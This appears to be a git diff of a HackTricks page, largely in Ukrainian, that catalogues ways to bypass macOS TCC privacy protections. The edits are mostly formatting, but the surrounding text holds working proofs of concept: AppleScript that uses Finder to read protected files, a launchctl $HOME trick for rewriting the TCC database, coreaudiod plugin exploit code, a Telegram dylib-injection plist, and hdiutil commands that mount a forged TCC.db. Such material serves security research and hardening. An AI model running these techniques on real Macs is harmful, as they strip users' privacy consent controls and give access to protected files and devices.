@@ -1,4 +1,4 @@
-# Пропуски TCC в macOS
+# macOS TCC Bypasses
 
 <details>
 
@@ -19,6 +19,7 @@
 ### Пропуск запису
 
 Це не пропуск, це просто те, як працює TCC: **Він не захищає від запису**. Якщо Термінал **не має доступу до читання Робочого столу користувача, він все ще може записувати в нього**:
+
 ```shell-session
 username@hostname ~ % ls Desktop
 ls: Desktop: Operation not permitted
@@ -28,13 +29,14 @@ ls: Desktop: Operation not permitted
 username@hostname ~ % cat Desktop/lalala
 asd
 ```
+
 **Розширений атрибут `com.apple.macl`** додається до нового **файлу**, щоб надати **додатку-створювачу** доступ до читання його.
 
 ### Обман користувача TCC
 
 Можливо **покласти вікно над вікном запиту TCC**, щоб змусити користувача **прийняти** його, не помічаючи. Ви можете знайти PoC в [**TCC-ClickJacking**](https://github.com/breakpointHQ/TCC-ClickJacking)**.**
 
-<figure><img src="broken-reference" alt=""><figcaption><p><a href="https://github.com/breakpointHQ/TCC-ClickJacking/raw/main/resources/clickjacking.jpg">https://github.com/breakpointHQ/TCC-ClickJacking/raw/main/resources/clickjacking.jpg</a></p></figcaption></figure>
+<figure><img src="https://github.com/carlospolop/hacktricks/blob/ua/macos-hardening/macos-security-and-privilege-escalation/macos-security-protections/macos-tcc/macos-tcc-bypasses/broken-reference" alt=""><figcaption><p><a href="https://github.com/breakpointHQ/TCC-ClickJacking/raw/main/resources/clickjacking.jpg">https://github.com/breakpointHQ/TCC-ClickJacking/raw/main/resources/clickjacking.jpg</a></p></figcaption></figure>
 
 ### Запит TCC за довільною назвою
 
@@ -75,7 +77,7 @@ asd
 
 **iMovie** та **Garageband** мали цей entitlement та інші, які дозволяли.
 
-Для отримання більш **інформації** про експлойт для **отримання токенів iCloud** з цього entitlement перегляньте виступ: [**#OBTS v5.0: "What Happens on your Mac, Stays on Apple's iCloud?!" - Wojciech Regula**](https://www.youtube.com/watch?v=_6e2LhmxVc0)
+Для отримання більш **інформації** про експлойт для **отримання токенів iCloud** з цього entitlement перегляньте виступ: [**#OBTS v5.0: "What Happens on your Mac, Stays on Apple's iCloud?!" - Wojciech Regula**](https://www.youtube.com/watch?v=\_6e2LhmxVc0)
 
 ### kTCCServiceAppleEvents / Automation
 
@@ -108,12 +110,15 @@ end tell
 end tell
 ```
 {% endcode %}
+
 ```bash
 osascript iterm.script
 ```
+
 #### Над Finder
 
 Або якщо додаток має доступ до Finder, він може виконати такий сценарій:
+
 ```applescript
 set a_user to do shell script "logname"
 tell application "Finder"
@@ -123,6 +128,7 @@ set t to paragraphs of (do shell script "cat " & POSIX path of (copyFile as alia
 end tell
 do shell script "rm " & POSIX path of (copyFile as alias)
 ```
+
 ## За поведінкою додатку
 
 ### CVE-2020–9934 - TCC <a href="#c19b" id="c19b"></a>
@@ -132,6 +138,7 @@ do shell script "rm " & POSIX path of (copyFile as alias)
 Згідно з [цим постом на Stack Exchange](https://stackoverflow.com/questions/135688/setting-environment-variables-on-os-x/3756686#3756686) і оскільки демон TCC працює через `launchd` в межах поточного домену користувача, можливо **контролювати всі змінні середовища**, які передаються йому.\
 Отже, **зловмисник може встановити змінну середовища `$HOME`** в **`launchctl`** для вказівки на **контрольований каталог**, **перезапустити** демона **TCC**, а потім **безпосередньо змінити базу даних TCC**, щоб надати собі **всі доступні привілеї TCC** без будь-якого запиту до кінцевого користувача.\
 PoC:
+
 ```bash
 # reset database just in case (no cheating!)
 $> tccutil reset All
@@ -158,6 +165,7 @@ NULL,
 # list Documents directory without prompting the end user
 $> ls ~/Documents
 ```
+
 ### CVE-2021-30761 - Примітки
 
 Примітки мали доступ до захищених місць TCC, але коли створюється примітка, це **створюється в незахищеному місці**. Таким чином, ви могли б попросити примітки скопіювати захищений файл у примітку (тобто в незахищеному місці) і потім отримати доступ до файлу:
@@ -190,11 +198,13 @@ $> ls ~/Documents
 Якщо змінна середовища **`SQLITE_AUTO_TRACE`** встановлена, бібліотека **`libsqlite3.dylib`** почне **логувати** всі SQL-запити. Багато додатків використовували цю бібліотеку, тому було можливо логувати всі їхні запити SQLite.
 
 Декілька додатків Apple використовували цю бібліотеку для доступу до захищеної інформації TCC.
+
 ```bash
 # Set this env variable everywhere
 launchctl setenv SQLITE_AUTO_TRACE 1
 ```
-### MTL_DUMP_PIPELINES_TO_JSON_FILE - CVE-2023-32407
+
+### MTL\_DUMP\_PIPELINES\_TO\_JSON\_FILE - CVE-2023-32407
 
 Цей **змінний середовища використовується фреймворком `Metal`**, який є залежністю для різних програм, зокрема `Music`, яка має FDA.
 
@@ -285,11 +295,13 @@ TCC використовує базу даних у домашній папці 
 Для збройовиковування цього CVE, **`NFSHomeDirectory`** змінюється (зловживаючи попереднім entitlement) для можливості **захоплення бази даних TCC користувача** для обходу TCC.
 
 Для отримання додаткової інформації перегляньте [**оригінальний звіт**](https://wojciechregula.blog/post/change-home-directory-and-bypass-tcc-aka-cve-2020-27937/).
+
 ### CVE-2020-29621 - Coreaudiod
 
 Бінарний файл **`/usr/sbin/coreaudiod`** мав entitlements `com.apple.security.cs.disable-library-validation` та `com.apple.private.tcc.manager`. Перший дозволяв **ін'єкцію коду**, а другий надавав доступ до **керування TCC**.
 
 Цей бінарний файл дозволяв завантажувати **сторонні плагіни** з папки `/Library/Audio/Plug-Ins/HAL`. Тому було можливо **завантажити плагін та зловжити дозволами TCC** за допомогою цього PoC:
+
 ```objectivec
 #import <Foundation/Foundation.h>
 #import <Security/Security.h>
@@ -316,6 +328,7 @@ add_tcc_entry();
 NSLog(@"[+] Exploitation finished...");
 exit(0);
 ```
+
 Для отримання додаткової інформації перевірте [**оригінальний звіт**](https://wojciechregula.blog/post/play-the-music-and-bypass-tcc-aka-cve-2020-29621/).
 
 ### Плагіни рівня абстракції пристрою (DAL)
@@ -329,6 +342,7 @@ exit(0);
 ### Firefox
 
 Додаток Firefox мав entitlements `com.apple.security.cs.disable-library-validation` та `com.apple.security.cs.allow-dyld-environment-variables`:
+
 ```xml
 codesign -d --entitlements :- /Applications/Firefox.app
 Executable=/Applications/Firefox.app/Contents/MacOS/firefox
@@ -354,6 +368,7 @@ Executable=/Applications/Firefox.app/Contents/MacOS/firefox
 </dict>
 </plist>
 ```
+
 Для отримання додаткової інформації про те, як легко використовувати це [**перевірте оригінальний звіт**](https://wojciechregula.blog/post/how-to-rob-a-firefox/).
 
 ### CVE-2020-10006
@@ -365,6 +380,7 @@ Executable=/Applications/Firefox.app/Contents/MacOS/firefox
 У Telegram були entitlements **`com.apple.security.cs.allow-dyld-environment-variables`** та **`com.apple.security.cs.disable-library-validation`**, тому було можливо зловживати цим, щоб **отримати доступ до його дозволів**, таких як запис з камери. Ви можете [**знайти навантаження в описі**](https://danrevah.github.io/2023/05/15/CVE-2023-26818-Bypass-TCC-with-Telegram/).
 
 Зверніть увагу на те, як використовувати змінну середовища для завантаження бібліотеки, було створено **власний plist** для впровадження цієї бібліотеки, і **`launchctl`** був використаний для її запуску:
+
 ```xml
 <?xml version="1.0" encoding="UTF-8"?>
 <!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
@@ -394,6 +410,7 @@ Executable=/Applications/Firefox.app/Contents/MacOS/firefox
 ```bash
 launchctl load com.telegram.launcher.plist
 ```
+
 ## За допомогою відкритих викликів
 
 Можливо викликати **`open`** навіть під час роботи в пісочниці
@@ -403,6 +420,7 @@ launchctl load com.telegram.launcher.plist
 Досить поширено надавати терміналу **Повний доступ до диска (FDA)**, принаймні на комп'ютерах, які використовують технічні спеціалісти. І можливо викликати сценарії **`.terminal`** за допомогою цього.
 
 Сценарії **`.terminal`** - це файли plist, такі як цей, з командою для виконання у ключі **`CommandString`**:
+
 ```xml
 <?xml version="1.0" encoding="UTF-8"?>
 <!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd"> <plist version="1.0">
@@ -420,7 +438,9 @@ launchctl load com.telegram.launcher.plist
 </dict>
 </plist>
 ```
+
 Додаток може написати термінальний скрипт у такому місці, як /tmp, і запустити його за допомогою команди:
+
 ```objectivec
 // Write plist in /tmp/tcc.terminal
 [...]
@@ -431,6 +451,7 @@ task.arguments = @[@"-a", @"/System/Applications/Utilities/Terminal.app",
 exploit_location]; task.standardOutput = pipe;
 [task launch];
 ```
+
 ## Шляхом монтування
 
 ### CVE-2020-9771 - обхід TCC та підвищення привілеїв через mount\_apfs
@@ -465,6 +486,7 @@ ls /tmp/snap/Users/admin_user # This will work
 ### CVE-2021-1784 & CVE-2021-30808 - Монтування над файлом TCC
 
 Навіть якщо файл бази даних TCC захищений, було можливо **монтувати над каталогом** новий файл TCC.db:
+
 ```bash
 # CVE-2021-1784
 ## Mount over Library/Application\ Support/com.apple.TCC
@@ -474,7 +496,7 @@ hdiutil attach -owners off -mountpoint Library/Application\ Support/com.apple.TC
 ## Mount over ~/Library
 hdiutil attach -readonly -owners off -mountpoint ~/Library /tmp/tmp.dmg
 ```
-{% endcode %}
+
 ```python
 # This was the python function to create the dmg
 def create_dmg():
@@ -485,6 +507,7 @@ os.system("mkdir -p /tmp/mnt/Application\ Support/com.apple.TCC/")
 os.system("cp /tmp/TCC.db /tmp/mnt/Application\ Support/com.apple.TCC/TCC.db")
 os.system("hdiutil detach /tmp/mnt 1>/dev/null")
 ```
+
 Перевірте **повний експлойт** у [**оригінальному описі**](https://theevilbit.github.io/posts/cve-2021-30808/).
 
 ### asr
